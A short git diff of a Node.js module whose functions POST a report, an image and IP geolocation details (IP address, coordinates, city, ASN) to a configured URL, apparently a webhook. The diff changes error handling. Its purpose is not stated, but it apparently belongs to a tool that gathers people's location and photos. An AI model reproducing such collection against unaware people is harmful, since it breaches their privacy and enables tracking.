@@ -11,8 +11,9 @@ module.exports = {
       body: JSON.stringify({ content: JSON.stringify({ report: msg }) }),
     },
     (error, response, body) => {
-      if(!error && response.statusCode == 200){
-        callback(body);
+      //console.log(response.statusCode)
+      if(!error){
+        callback({error: false, details: 'Details Sent to URL'});
       }
       else{
         callback({error: true, details: 'Details Not Sent to URL'})
@@ -35,8 +36,8 @@ module.exports = {
       },
     },
     (err, response, body) => {
-      if (!err && response.statusCode == 200) {
-        callback(body)
+      if (!err) {
+        callback({error: true, details: 'Image Sent to URL'})
       }
       else {
         callback({error: true, details: 'Image Not Sent to URL'})
@@ -58,15 +59,15 @@ module.exports = {
         request({
           method: 'POST',
           url,
-          headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             content: JSON.stringify({
               ip: body.ip, lat: body.latitude, long: body.longitude, city: body.city, asn: body.asn, flag: body.emoji_flag,
             }),
           }),
         }, (e, r, b) => {
-          if(!e && r.statusCode == 200){
-            callback(b)
+          //console.log(r.statusCode)
+          if(!e){
+            callback({error:false, details: 'IP Data Sent To Url'})
           }
           else{
             callback({error:true, details: 'IP Data Not Sent To Url'})
